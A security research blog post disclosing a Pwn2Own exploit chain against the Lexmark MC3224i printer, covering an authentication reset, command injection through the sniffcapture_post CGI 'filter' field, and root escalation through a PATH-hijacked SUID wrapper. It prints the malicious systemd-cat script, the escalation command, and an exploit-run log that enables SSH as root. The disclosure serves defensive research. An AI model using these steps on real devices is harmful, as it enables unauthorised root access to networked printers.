# For the Common Good: How to Compromise a Printer in Three Simple Steps

- **Source :** crowdstrike
- **URL :** https://www.crowdstrike.com/en-us/blog/how-to-compromise-a-printer-in-3-simple-steps/
- **Date :** June 07, 2022

---

# For the Common Good: How to Compromise a Printer in Three Simple Steps

June 07, 2022

• [ Benjamin Grap - Hanno Heinrichs - Lukas Kupczyk](/en-us/blog/author.benjamin-grap---hanno-heinrichs---lukas-kupczyk/ "Posts by Benjamin Grap - Hanno Heinrichs - Lukas Kupczyk") • [Threat Hunting & Intel](/en-us/blog/category.counter-adversary-operations/ "Threat Hunting & Intel")


In August 2021, [ZDI announced Pwn2Own Austin 2021](https://www.zerodayinitiative.com/blog/2021/8/11/pwn2own-austin-2021-phones-printers-nas-and-more), a security contest focusing on phones, printers, NAS devices and smart speakers, among other things. The Pwn2Own contest encourages security researchers to demonstrate remote zero-day exploits against a list of specified devices. If successful, the researchers are rewarded with a cash prize, and the leveraged vulnerabilities are responsibly disclosed to the respective vendors so they can improve the security of their products. After reviewing the list of devices, we decided to target the Cisco RV340 router and the Lexmark MC3224i printer, and we managed to identify several vulnerabilities in both of them. Fortunately, we were [luckier than last year](/en-us/blog/pwn2own-tale-of-a-bug-found-and-lost-again/) and were able to participate in the contest for the first time. By successfully exploiting both devices, we won $20,000 USD, which CrowdStrike donated to several charitable organizations chosen by our researchers. In this blog post, we outline the vulnerabilities we discovered and used to compromise the Lexmark printer.

## Overview

Product| Lexmark MC3224  
---|---  
Affected Firmware Versions (without claim for completeness)| CXLBL.075.272 (2021-07-29) CXLBL.075.281 (2021-10-14)  
Fixed Firmware Version| CXLBL.076.294 (CVE-2021-44735) Note: Users must implement a workaround to address CVE-2021-44736, see [Lexmark Security Alert](https://publications.lexmark.com/publications/security-alerts/CVE-2021-44736.pdf)  
CVE| CVE-2021-44735 (Shell Command Injection) CVE-2021-44736 (Authentication Reset)  
Root Causes| Authentication Bypass, Shell Command Injection, Insecure SUID Binary  
Impact| Unauthenticated Remote Code Execution (RCE) as **root**  
Researchers| Hanno Heinrichs, Lukas Kupczyk  
Lexmark Resources| https<:>//publications.lexmark<.>com/publications/security-alerts/CVE-2021-44735.pdf https<:>//publications.lexmark<.>com/publications/security-alerts/CVE-2021-44736.pdf  
  
## Step #1: Increasing Attack Surface via Authentication Reset

Before we could start our analysis, we first had to obtain a copy of the firmware. It quickly turned out that the firmware is shipped as an `.fls` file in a custom binary format containing encrypted data. Luckily, [a detailed writeup](https://claroty.com/team82/research/lexmark-printers-firmware-extraction-part-a) on the encryption scheme had been published in September 2020. While the writeup did not include code or cryptographic keys, it was elaborate enough that we were able to quickly reproduce it and write our own decrypter. With our firmware decryption tool at hand, we were finally able to peek into the firmware. It was assumed that the printer would be in a default configuration during the contest and that the setup wizard on the printer had been completed. Thus, we expected the administrator password to be set to an unknown value. In this state, unauthenticated users can still trigger a vast amount of actions through the web interface. One of these is _Sanitize all information on nonvolatile memory_. It can be found under _Settings_ -> _Device_ -> _Maintenance_. There are several options to choose from when performing that action:
    
    
     Sanitize all information on nonvolatile memory (x) Start initial setup wizard ( ) Leave printer offline Erase all printer and network settings Erase all shortcuts and shortcut settings
    

If the checkboxes are ticked as shown, the process can be initiated through the _Start_ button. The printer's non-volatile memory will be cleared and a reboot is initiated. This process takes approximately two minutes. Afterward, unauthenticated users can access _all_ functions through the web interface.

## Step #2: Shell Command Injection

After resetting the `nvram` as outlined in the previous section, the CGI script `https://target/cgi-bin/sniffcapture_post` becomes accessible without authentication. It was previously discovered by browsing the decrypted firmware and is located in the directory `/usr/share/web/cgi-bin`. At the beginning of the script, the supplied POST body is stored in the variable data. Afterward, several other variables such as `interface`, `dest`, `path`

and `filter` are extracted and populated from that data by using `sed`:
    
    
    read data
    
    remove=${data/*-r*/1}
    if < "x${remove}" != "x1" >; then
        remove=0
    fi
    **interface** =$(echo ${data} | **sed** -n 's|^.*-i<<:space:>>\(<^<:space:>>\+\).*$|\1|p')
    **dest** =$(echo ${data} | **sed** -n 's|^.*-f<<:space:>>\(<^<:space:>>\+\).*$|\1|p')
    **path** =$(echo ${data} | **sed** -n 's|^.*-f<<:space:>>\(<^<:space:>>\+\).*$|\1|p')
    method="startSniffer"
    auto=0
    if < "x${dest}" = "x/dev/null" >; then
        method="stopSniffer"
    elif < "x${dest}" = "x/usr/bin" >; then
        auto=1
    fi
    **filter** =$(echo ${data} | **sed** -n 's|^.*-F<<:space:>>\+\(<">\)\(.*\)\1.*$|\2|p')
    args="-i ${interface} -f ${dest}/sniff_control.pcap"
    

The variable `filter` is determined by a quoted string following the value `-F` specified in the POST body. As shown below, it is later embedded into the `args` variable in case it has been specified along with an interface:
    
    
    fmt=""
    args=""
    if < ${remove} -ne 0 >; then
        fmt="${fmt}b"
        args="${args} remove 1"
    fi
    if < -n "${interface}" >; then
        fmt="${fmt}s"
        args="${args} interface ${interface}"
        if < -n "${filter}" >; then
            fmt="${fmt}s"
            **args** ="${args} **filter** \"${filter}\""
        fi
        if < ${auto} -ne 0 >; then
            fmt="${fmt}b"
            args="${args} auto 1"
        else
            fmt="${fmt}s"
            args="${args} dest ${dest}"
        fi
    fi
    <...>
    

At the end of the script, the resulting `args` value is used in an `eval` statement:
    
    
    <...>
    resp=""
    if < -n "${fmt}" >; then
        resp=$(**eval** rob call system.sniffer ${method} "{${fmt}}" ${**args** :1} 2>/dev/null)
        submitted=1
    <...>
    

By controlling the `filter` variable, attackers are therefore able to inject further shell commands and gain access to the printer as `uid=985(httpd)`, which is the user that the web server is executed as.

## Step #3: Privilege Escalation

The printer ships a custom root-owned SUID binary called `collect-selogs-wrapper`:
    
    
    # ls -la usr/bin/collect-selogs-wrapper
    -rwsr-xr-x. 1 root root 7324 Jun 14 15:46 usr/bin/collect-selogs-wrapper
    

In its `main()` function, the _effective_ user ID (0) is retrieved and the process’s _real_ user ID is set to that value. Afterward, the shell script `/usr/bin/collect-selogs.sh` is executed:
    
    
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      __uid_t euid; // r0
    
      euid = geteuid();
      if ( setuid(euid) )
        perror("setuid");
      return execv("/usr/bin/collect-selogs.sh", (char *const *)argv);
    }
    

Effectively, the shell script is executed as root with UID=EUID, and therefore the shell does not drop privileges. Furthermore, `argv<>` of the SUID binary is passed to the shell script. As the environment variables are also retained across the `execv() `call, an attacker is able to specify a malicious `$PATH` value. Any command inside the shell script that is not referenced by its absolute path can thereby be detoured by the attacker. The first opportunity for such an attack is the invocation of `systemd-cat` inside `sd_journal_print()`:
    
    
    # cat usr/bin/collect-selogs.sh
    #!/bin/sh
    # Collects fwdebug from the current state plus the last 3 fwdebug files from
    # previous auto-collections. The collected files will be archived and compressed
    # to the requested output directory or to the standard output if the output
    # directory is not specified.
    
    sd_journal_print() {
        systemd-cat -t collect-selogs echo "$@"
    }
    
    sd_journal_print "Start! params: '$@'"
    
    <...>
    

The `/dev/shm` directory can be used to prepare a malicious version of `systemd-cat`:
    
    
    $ cat /dev/shm/systemd-cat
    #!/bin/sh
    mount -o remount,suid /dev/shm
    cp /usr/bin/python3 /dev/shm
    chmod +s /dev/shm/python3
    $ chmod +x /dev/shm/systemd-cat
    

This script remounts `/dev/shm` with the `suid` flag so that SUID binaries can be executed from it. It then copies the system's Python interpreter to the same directory and enables the SUID bit on it. The malicious `systemd-cat` copy can be executed as root by invoking the setuid `collect-setlogs-wrapper` binary like this: `$ PATH=/dev/shm:$PATH /usr/bin/collect-selogs-wrapper` The `$PATH` environment variable is prepended with the `/dev/shm` directory that hosts the malicious `systemd-cat` copy. After executing the command, a root-owned SUID-enabled copy of the Python interpreter is located in `/dev/shm`:
    
    
    root@ET788C773C9E20:~# ls -la /dev/shm
    drwxrwxrwt    2 root     root           100 Oct 29 09:33 .
    drwxr-xr-x   13 root     root          5160 Oct 29 09:31 ..
    -rwsr-sr-x    1 root     httpd         8256 Oct 29 09:33 python3
    -rw-------    1 nobody   nogroup         16 Oct 29 09:31 sem.netapps.rawprint
    -rwxr-xr-x    1 httpd    httpd           96 Oct 29 09:33 systemd-cat
    

The idea behind this technique is to establish a simple way of escalating privileges without having to exploit the initial `collect_selogs_wrapper` SUID again. We did not use the Bash binary for this, as the version shipped with the printer seems to ignore the `-p` flag when running with UID!=EUID.

## Exploit

An exploit combining the three vulnerabilities to gain unauthenticated code execution as root

has been implemented as a Python script. First, the exploit tries to determine whether the printer has a login password set (i.e., setup wizard has been completed) or it is password-less (i.e., authentication reset already executed earlier or setup wizard not yet completed). Depending on the result, it decides whether the non-volatile memory reset is required. If the non-volatile memory reset is triggered, the exploit waits for the printer to finish rebooting. Afterward, it continues with the shell command injection step and [escalation of privileges](/en-us/cybersecurity-101/cyberattacks/privilege-escalation/). The privileged access is then used to start an OpenSSH daemon on the printer. To finish, the exploit establishes an interactive SSH session with the printer and hands control over to the user. An example run of the exploit in a testing environment follows:
    
    
    $ ./mc3224i_exploit.py https://10.64.23.20/ sshd
    <*> Probing device...
    <+> Firmware: CXLBL.075.281
    <+> Acceptable login methods: <'LDAP_DEVICE_REALM',        
        'LOGIN_METHODS_WITH_CREDS'>
    <*> Device IS password protected, auth bypass required
    <*> Erasing nvram...
    <+> Success! HTTP status: 200, rc=1
    <*> Waiting for printer to reboot, sleeping 5 seconds...
    <*> Checking status...
    xxxxxxxxxxxxxxxxxxxxxxx!
    <+> Reboot finished
    <*> Probing device...
    <+> Firmware: CXLBL.075.281
    <+> Acceptable login methods: <'LDAP_DEVICE_REALM'>
    <*> Device IS NOT password protected
    <+> Authentication bypass done
    <*> Attempting to escalate privileges...
    <*> Executing command (root? False):
        echo -e '#!/bin/sh\\n
        mount -o remount,suid /dev/shm\\n
        cp /usr/bin/python3 /dev/shm\\nchmod +s /dev/shm/python3' >
        /dev/shm/systemd-cat; chmod +x /dev/shm/systemd-cat
    <+> HTTP status: 200
    <*> Executing command (root? False): PATH=/dev/shm:$PATH /usr/bin/collect-selogs-wrapper
    <+> request timed out, that’s what we expect
    <+> SUID Python interpreter should be created
    <*> Attempting to enable SSH daemon...
    <*> Executing command (root? True):
    sed -Ee 's/(RSAAuthentication|UsePrivilegeSeparation|UseLogin)/#\\1/g'
        -e 's/AllowUsers guest/AllowUsers root guest/'
        /etc/ssh/sshd_config_perf > /tmp/sshconf;
        mkdir /var/run/sshd;
        iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT;
        nohup /usr/sbin/sshd -f /tmp/sshconf &
    <+> HTTP status: 200
    <+> SSH daemon should be running
    <*> Trying to call ssh... ('ssh', '-i', '/tmp/tmpd2vc5a2u', 'root@10.64.23.20')
    root@ET788C773C9E20:~# id
    uid=0(root) gid=0(root) groups=0(root)
    

## Summary

In this blog, we described a number of vulnerabilities that can be exploited from the local network to bypass authentication, execute arbitrary shell commands, and elevate privileges on a Lexmark MC3224i printer. The research started as an experiment after the announcement of the Pwn2Own Austin 2021. The team enjoyed the challenge, as well as participating in Pwn2Own for the first time, and we welcome your feedback. We’d also like to invite you to read about the other device we successfully targeted during Pwn2Own Austin 2021, the [Cisco RV340 router](/en-us/blog/how-to-pwn2own-the-cisco-rv340-router/).

#### Additional Resources

  * _Request a free[ CrowdStrike Intelligence threat briefing](https://go.crowdstrike.com/threat-intelligence-briefing.html?utm_campaign=threatintelligence&utm_content=us&utm_medium=sem&utm_source=goog&utm_term=cyber%20threat%20intelligence&_bt=465670942471&_bk=cyber%20threat%20intelligence&_bm=e&_bn=g&_bg=108022039334&gclid=EAIaIQobChMIqsSdwZ-j7AIV9R6tBh23rQErEAAYASAAEgKc8fD_BwE&_ga=2.145914102.359113952.1606756854-1198667695.1606243810) and learn how to stop adversaries targeting your organization._
  * _Learn how to incorporate intelligence on dangerous threat actors into your security strategy by visiting the[ CrowdStrike CROWDSTRIKE FALCON® INTELLIGENCE™ product page](/en-us/endpoint-security-products/falcon-x-threat-intelligence/)._
  * _Read the[ CrowdStrike 2022 Global Threat Report](/en-us/resources/reports/global-threat-report/)._
  * _Learn more about the[ CrowdStrike Falcon®® platform by visiting the product webpage.](/en-us/endpoint-security-products/falcon-platform/)_
  * _Test CrowdStrike next-gen AV for yourself. Start your[ free trial of Falcon Prevent™](https://go.crowdstrike.com/try-falcon-prevent.html) today._



[ ](https://www.linkedin.com/shareArticle) [ ](https://twitter.com/share)

* * *

#### Related Content

[ ![CrowdStrike Named a Leader in The Forrester Wave™: External Threat Intelligence Service Providers, Q3 2026](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Forrester%20Wave%20Threat%20Intel%202026-2-1060x698_Blog?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Sep 17, 2026  CrowdStrike Named a Leader in The Forrester Wave™: External Threat Intelligence Service Providers, Q3 2026 ](/en-us/blog/crowdstrike-named-leader-forrester-wave-external-threat-intelligence-q3-2026/) [ ![PhantomRaven: An LLM-Generated Information Stealer Developed for Bug Bounty Hunting](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-InfoStealer?wid=2048&hei=1349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Sep 15, 2026  PhantomRaven: An LLM-Generated Information Stealer Developed for Bug Bounty Hunting ](/en-us/blog/phantomraven-llm-generated-information-stealer-for-bug-bounty-hunting/) [ ![Peer Pressure: Inside the Sality Botnet Disruption Operation](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FalCon-Sality?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Sep 01, 2026  Peer Pressure: Inside the Sality Botnet Disruption Operation ](/en-us/blog/inside-sality-botnet-disruption-operation/)